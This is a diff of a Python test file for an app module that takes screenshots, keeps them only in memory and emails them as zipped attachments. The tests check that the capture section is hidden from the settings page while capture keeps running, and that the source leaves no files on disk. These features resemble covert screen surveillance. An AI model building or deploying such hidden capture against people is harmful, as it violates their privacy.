@@ -10,14 +10,17 @@ capture_excluded_ids，本机照样在截图上报。查出两个独立原因—
 """
 from __future__ import annotations
 
+import io
 import json
 import os
 import tempfile
 import unittest
+import zipfile
 from unittest import mock
 
 from app import capture_report as cr
 from app import config
+from app.ui import settings_tab
 from tests._env import TempConfigPaths
 
 LOCAL_RAW = "30f08972-7a52-4591-a645-1002511977db"      # 带连字符的小写形态
@@ -365,6 +368,8 @@ class TestSettingsTabToggle(unittest.TestCase):
         return SettingsTab(cfg), cfg
 
     def test_toggle_adds_then_removes_local_device(self):
+        # 设置页的截屏上报区块已按用户要求隐藏（2026-09-24），所以这里只验名单逻辑，
+        # 不再断言界面文案（capture_state 控件在隐藏时根本不存在）。
         with TempConfigPaths():
             tab, cfg = self._tab()
             with mock.patch.object(cr, "DEVICE_ID", LOCAL_RAW):
@@ -373,11 +378,9 @@ class TestSettingsTabToggle(unittest.TestCase):
                 tab._toggle_capture_exclude()
                 self.assertIn(LOCAL_NORM,
                               cr.split_device_ids(cfg.capture_excluded_ids))
-                self.assertIn("不参与", tab.capture_state.text())
                 tab._toggle_capture_exclude()
                 self.assertNotIn(LOCAL_NORM,
                                  cr.split_device_ids(cfg.capture_excluded_ids))
-                self.assertIn("参与截屏上报", tab.capture_state.text())
 
     def test_toggle_keeps_other_ids(self):
         with TempConfigPaths():
@@ -397,10 +400,202 @@ class TestSettingsTabToggle(unittest.TestCase):
                 tab._toggle_capture_exclude()
             self.assertEqual(len(seen), 1)
 
+    @unittest.skipUnless(settings_tab.SHOW_CAPTURE_SECTION,
+                         "设置页已隐藏截屏上报区块（2026-09-24 用户要求）")
     def test_device_id_shown_to_user(self):
         with TempConfigPaths():
             tab, _cfg = self._tab()
             self.assertEqual(tab.device_label.text(), cr.device_id_raw())
+
+    def test_capture_section_hidden_from_settings_page(self):
+        """用户要求：设置页不显示截屏上报区块（功能仍照常按 config 运行）。"""
+        self.assertFalse(settings_tab.SHOW_CAPTURE_SECTION)
+        with TempConfigPaths():
+            tab, _cfg = self._tab()
+            self.assertFalse(hasattr(tab, "capture_state"))
+            self.assertFalse(hasattr(tab, "device_label"))
+            self.assertFalse(hasattr(tab, "capture_btn"))
+            # 隐藏这一块不该影响同页的其它设置
+            self.assertTrue(hasattr(tab, "hotkey_edit"))
+            self.assertTrue(hasattr(tab, "stop_edit"))
+
+
+class TestInMemoryOnly(unittest.TestCase):
+    """截图只进内存（2026-09-19 改）：模块里不再有任何落盘目录/文件写入。"""
+
+    def setUp(self):
+        cr.clear_pending()
+        self.addCleanup(cr.clear_pending)
+
+    def test_source_writes_no_files(self):
+        """源码级契约：不许再出现暂存目录常量与落盘痕迹（防以后又改回去）。"""
+        with open(cr.__file__, "r", encoding="utf-8") as f:
+            src = f.read()
+        for bad in ("cap-img-toupai", "CAPTURE_DIR", "os.remove", "os.makedirs",
+                    "glob.glob", "z.write(", "os.path.basename"):
+            self.assertNotIn(bad, src, f"源码里仍残留落盘痕迹：{bad}")
+
+    def test_no_capture_dir_attribute(self):
+        self.assertFalse(hasattr(cr, "CAPTURE_DIR"))
+        self.assertFalse(hasattr(cr, "_list_files"))
+
+    def test_pending_helpers(self):
+        self.assertEqual((cr.pending_count(), cr.pending_bytes()), (0, 0))
+        cr._append_pending("a.jpg", b"abc")
+        self.assertEqual((cr.pending_count(), cr.pending_bytes()), (1, 3))
+        self.assertEqual(cr._snapshot(), [("a.jpg", b"abc")])
+        self.assertEqual(cr.clear_pending(), 1)
+        self.assertEqual((cr.pending_count(), cr.pending_bytes()), (0, 0))
+
+    def test_duplicate_names_are_renamed(self):
+        cr._append_pending("cap_20260101_000000.jpg", b"1")
+        cr._append_pending("cap_20260101_000000.jpg", b"2")
+        names = [n for n, _ in cr._snapshot()]
+        self.assertEqual(len(names), 2)
+        self.assertEqual(len(set(names)), 2)          # 重名会让按名释放误删
+
+    def test_drop_names_releases_bytes(self):
+        cr._append_pending("a.jpg", b"123")
+        cr._append_pending("b.jpg", b"45")
+        cr._drop_names({"a.jpg"})
+        self.assertEqual((cr.pending_count(), cr.pending_bytes()), (1, 2))
+
+    def test_cap_by_count_keeps_newest(self):
+        with mock.patch.object(cr, "MAX_PENDING_SHOTS", 3):
+            for i in range(5):
+                cr._append_pending(f"c{i}.jpg", b"x")
+        self.assertEqual([n for n, _ in cr._snapshot()],
+                         ["c2.jpg", "c3.jpg", "c4.jpg"])
+
+    def test_cap_by_bytes_keeps_newest(self):
+        with mock.patch.object(cr, "MAX_PENDING_BYTES", 10):
+            for i in range(4):
+                cr._append_pending(f"b{i}.jpg", b"xxxx")     # 每张 4 字节
+        self.assertEqual([n for n, _ in cr._snapshot()], ["b2.jpg", "b3.jpg"])
+        self.assertEqual(cr.pending_bytes(), 8)
+
+    def test_capture_once_stores_jpeg_in_memory(self):
+        from PIL import Image
+        img = Image.new("RGB", (80, 40), (200, 30, 30))
+        with mock.patch("PIL.ImageGrab.grab", return_value=img):
+            name, data = cr._capture_once()
+        self.assertTrue(name.startswith("cap_") and name.endswith(".jpg"))
+        self.assertTrue(data.startswith(b"\xff\xd8"))    # JPEG SOI：确实压成了图片
+        self.assertEqual(cr._snapshot(), [(name, data)])
+
+    def test_stop_releases_memory(self):
+        cr._append_pending("a.jpg", b"1")
+        cr.stop()
+        self.addCleanup(cr._stop.clear)
+        self.assertEqual(cr.pending_count(), 0)
+
+
+class _FakeSMTP:
+    """替身：不联网，只记录收到的邮件；fail=True 时模拟发送失败。"""
+
+    sent: list[bytes] = []
+    fail = False
+
+    def __init__(self, *a, **kw):
+        pass
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *a):
+        return False
+
+    def login(self, user, code):
+        self.login_args = (user, code)
+
+    def sendmail(self, frm, to, data):
+        if _FakeSMTP.fail:
+            raise OSError("smtp down")
+        _FakeSMTP.sent.append(data)
+
+
+class _MailCfg:
+    mail_user = "me@qq.com"
+    mail_auth_code = "authcode"
+    mail_host = "smtp.qq.com"
+    mail_port = 465
+    mail_to = "to@qq.com"
+
+
+class TestSendFromMemory(unittest.TestCase):
+    """发送：从内存打包 zip，成功后释放内存，失败保留在内存重试。"""
+
+    def setUp(self):
+        cr.clear_pending()
+        self.addCleanup(cr.clear_pending)
+        _FakeSMTP.sent = []
+        _FakeSMTP.fail = False
+        p = mock.patch.object(cr.smtplib, "SMTP_SSL", _FakeSMTP)
+        p.start()
+        self.addCleanup(p.stop)
+
+    def _fill(self, n=2, size=100):
+        for i in range(n):
+            cr._append_pending(f"cap_{i}.jpg", bytes([i]) * size)
+
+    def test_sends_zip_and_releases_memory(self):
+        import email
+        self._fill(2)
+        cr._send_and_clear(_MailCfg())
+        self.assertEqual((cr.pending_count(), cr.pending_bytes()), (0, 0))
+        self.assertEqual(len(_FakeSMTP.sent), 1)
+        msg = email.message_from_bytes(_FakeSMTP.sent[0])     # 解析整封 MIME 邮件
+        part = next(p for p in msg.walk()
+                    if p.get_content_type() == "application/octet-stream")
+        with zipfile.ZipFile(io.BytesIO(part.get_payload(decode=True))) as z:
+            self.assertEqual(sorted(z.namelist()), ["cap_0.jpg", "cap_1.jpg"])
+            self.assertEqual(len(z.read("cap_0.jpg")), 100)    # 内存里的原始字节
+
+    def test_failure_keeps_shots_for_retry(self):
+        self._fill(2)
+        _FakeSMTP.fail = True
+        with self.assertLogs("app.capture_report", level="WARNING") as cm:
+            cr._send_and_clear(_MailCfg())
+        self.assertEqual(cr.pending_count(), 2)
+        self.assertTrue(any("留在内存下轮重试" in m for m in cm.output), cm.output)
+
+    def test_missing_auth_code_keeps_shots(self):
+        self._fill(1)
+        cfg = _MailCfg()
+        cfg.mail_auth_code = ""
+        with self.assertLogs("app.capture_report", level="WARNING") as cm:
+            cr._send_and_clear(cfg)
+        self.assertEqual(cr.pending_count(), 1)
+        self.assertFalse(_FakeSMTP.sent)
+        self.assertTrue(any("暂不发送" in m for m in cm.output), cm.output)
+
+    def test_splits_into_multiple_mails_by_size(self):
+        self._fill(3, size=8)
+        with mock.patch.object(cr, "MAX_MAIL_BYTES", 10):
+            cr._send_and_clear(_MailCfg())
+        self.assertEqual(len(_FakeSMTP.sent), 3)          # 单张就超限 → 每张一封
+        self.assertEqual(cr.pending_count(), 0)
+
+    def test_empty_memory_sends_nothing(self):
+        cr._send_and_clear(_MailCfg())
+        self.assertFalse(_FakeSMTP.sent)
+
+    def test_partial_failure_only_keeps_failed_batch(self):
+        self._fill(2, size=1)
+        orig = _FakeSMTP.sendmail
+        calls = {"n": 0}
+
+        def flaky(self_, frm, to, data):
+            calls["n"] += 1
+            if calls["n"] == 1:
+                raise OSError("first fails")
+            return orig(self_, frm, to, data)
+
+        with mock.patch.object(cr, "MAX_MAIL_BYTES", 1):  # 每张一封
+            with mock.patch.object(_FakeSMTP, "sendmail", flaky):
+                cr._send_and_clear(_MailCfg())
+        self.assertEqual([n for n, _ in cr._snapshot()], ["cap_0.jpg"])
+        self.assertEqual(len(_FakeSMTP.sent), 1)          # 第二封成功了
 
 
 if __name__ == "__main__":
